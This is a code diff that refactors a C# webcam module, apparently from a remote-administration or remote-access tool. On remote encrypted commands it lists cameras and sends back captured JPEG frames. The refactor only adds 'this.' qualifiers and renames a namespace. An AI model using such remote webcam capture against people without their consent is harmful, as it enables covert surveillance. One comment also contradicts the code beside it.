@@ -2,17 +2,17 @@
 using System.Threading;
 using bc.srv.Classes.Comunicator;
 
-namespace bc.srv.Muduli.WebCam
+namespace bc.srv.Modules.WebCam
 {
     internal class WebCamAgent
     {
         public WebCamAgent(NetworkStream ns)
         {
-            webcamStream = ns;
+            this.webcamStream = ns;
 
-            mfm = new MsgFileManager(webcamStream);
-            mm = new MsgManager(webcamStream);
-            cc = new CapCam();
+            this.mfm = new MsgFileManager(this.webcamStream);
+            this.mm = new MsgManager(this.webcamStream);
+            this.cc = new CapCam();
         }
 
         /// <summary>
@@ -20,7 +20,7 @@ namespace bc.srv.Muduli.WebCam
         /// </summary>
         public void StartWebCamListener()
         {
-            var t = new Thread(WebCamListener);
+            var t = new Thread(this.WebCamListener);
             t.IsBackground = true;
             t.SetApartmentState(ApartmentState.STA);
             t.Start();
@@ -32,13 +32,13 @@ namespace bc.srv.Muduli.WebCam
         /// </summary>
         private void WebCamListener()
         {
-            while (SrvData.Instance.isConnected && !stopWebCamListener)
+            while (SrvData.Instance.isConnected && !this.stopWebCamListener)
             {
                 Thread.Sleep(10);
 
-                var cmd = mm.WaitForEncryMessageRicorsive(10000);
+                var cmd = this.mm.WaitForEncryMessageRicorsive(10000);
 
-                if (stopWebCamListener)
+                if (this.stopWebCamListener)
                     break;
 
                 if (cmd != "TIMEOUT" && cmd != "__ERROR__")
@@ -49,17 +49,17 @@ namespace bc.srv.Muduli.WebCam
                     {
                         case "WC_DEVICES":
                             // INVIA LISTA DEI DEVICE WEBCAM
-                            SendDevices();
+                            this.SendDevices();
                             break;
 
                         case "CAPTURE_WC":
                             // CAPTURE_WC|NUMERO DRIVER|QUALITA|DIMENSIONIx|DIMENSIONIy
-                            SendCapture(int.Parse(cmdSplit[1]), int.Parse(cmdSplit[2]), int.Parse(cmdSplit[3]),
+                            this.SendCapture(int.Parse(cmdSplit[1]), int.Parse(cmdSplit[2]), int.Parse(cmdSplit[3]),
                                 int.Parse(cmdSplit[4]));
                             break;
 
                         case "DISCONNECT_WC":
-                            Disconnect();
+                            this.Disconnect();
                             break;
                     }
                 }
@@ -67,13 +67,13 @@ namespace bc.srv.Muduli.WebCam
 
             // ARRIVO QUI PERCHè IL LISTENER è MORTO
 
-            if (SrvData.Instance.nsListaCanali.Contains(webcamStream))
-                SrvData.Instance.nsListaCanali.Remove(webcamStream);
+            if (SrvData.Instance.nsListaCanali.Contains(this.webcamStream))
+                SrvData.Instance.nsListaCanali.Remove(this.webcamStream);
 
 
             try
             {
-                webcamStream.Close();
+                this.webcamStream.Close();
             }
             catch
             {
@@ -87,13 +87,13 @@ namespace bc.srv.Muduli.WebCam
         /// </summary>
         private void SendDevices()
         {
-            var drivers = cc.GetWcDrivers();
+            var drivers = this.cc.GetWcDrivers();
 
             var sent = false;
 
             if (drivers.Count == 0)
             {
-                sent = mm.SendEncryMessage("NO_WC_DRIVERS", 10000);
+                sent = this.mm.SendEncryMessage("NO_WC_DRIVERS", 10000);
             }
             else
             {
@@ -103,11 +103,11 @@ namespace bc.srv.Muduli.WebCam
 
                 message = message.TrimEnd('|');
 
-                sent = mm.SendEncryMessage(message, 10000);
+                sent = this.mm.SendEncryMessage(message, 10000);
             }
 
             // SE NON RIESCO A MANDARE IL MESSAGGIO CHIUDO IL CANALE
-            stopWebCamListener = !sent;
+            this.stopWebCamListener = !sent;
         }
 
         #region MEMBERS
@@ -138,24 +138,24 @@ namespace bc.srv.Muduli.WebCam
         /// <param name="deviceNumber"></param>
         private void SendCapture(int deviceNumber, int quality, int xSize, int ySize)
         {
-            if (!isDeviceConnect)
-                isDeviceConnect = Connect(deviceNumber);
+            if (!this.isDeviceConnect)
+                this.isDeviceConnect = this.Connect(deviceNumber);
 
 
-            if (isDeviceConnect) // RICONTROLLO IN CASO DI TENTATA CONNESSIONE
+            if (this.isDeviceConnect) // RICONTROLLO IN CASO DI TENTATA CONNESSIONE
             {
-                var capturedJpg = cc.Capture(quality, xSize, ySize);
+                var capturedJpg = this.cc.Capture(quality, xSize, ySize);
 
                 if (capturedJpg != null)
                 {
-                    var sent = mfm.SendEncryFileByte(capturedJpg, 10000);
+                    var sent = this.mfm.SendEncryFileByte(capturedJpg, 10000);
                 }
             }
             else
             {
                 // impossibile connettersi al device
 
-                mm.SendEncryMessage("NO_CONNECTION", 5000);
+                this.mm.SendEncryMessage("NO_CONNECTION", 5000);
             }
         }
         //---------------------------------
@@ -168,7 +168,7 @@ namespace bc.srv.Muduli.WebCam
         /// <returns></returns>
         private bool Connect(int device)
         {
-            return cc.TryConnect(device);
+            return this.cc.TryConnect(device);
         }
         //---------------------------------
 
@@ -178,11 +178,11 @@ namespace bc.srv.Muduli.WebCam
         /// </summary>
         private void Disconnect()
         {
-            if (isDeviceConnect)
-                cc.Disconnect();
+            if (this.isDeviceConnect)
+                this.cc.Disconnect();
 
-            isDeviceConnect = false;
-            stopWebCamListener = false; // CHIUDE ANCHE IL THREAD DI ASCOLTO
+            this.isDeviceConnect = false;
+            this.stopWebCamListener = false; // CHIUDE ANCHE IL THREAD DI ASCOLTO
         }
 
         #endregion
